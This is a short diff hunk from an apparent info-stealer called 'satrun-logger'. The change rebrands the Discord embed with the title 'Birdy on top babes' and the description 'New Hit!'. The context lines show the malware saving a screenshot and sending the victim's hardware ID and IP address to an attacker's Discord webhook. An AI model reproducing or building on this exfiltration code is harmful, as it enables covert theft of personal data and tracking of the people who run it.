@@ -38,7 +38,7 @@ screenshot.save('./data/screenshot.png')
 
 # Webhook URL
 webhook = DiscordWebhook(url=f'{WEBHOOK}', rate_limit_retry=True)
-embed = DiscordEmbed(title='Miguelito on top babes', description='Never dox the doxxer.', color=242424)
+embed = DiscordEmbed(title='Birdy on top babes', description='New Hit!', color=242424)
 embed.set_author(name='Made by Birdy', url='https://github.com/birdy-py/satrun-logger')
 embed.add_embed_field(name="HWID", value=f"||{hw_id}||", inline=False)
 embed.add_embed_field(name="IP", value=f"||{ip}||", inline=False)
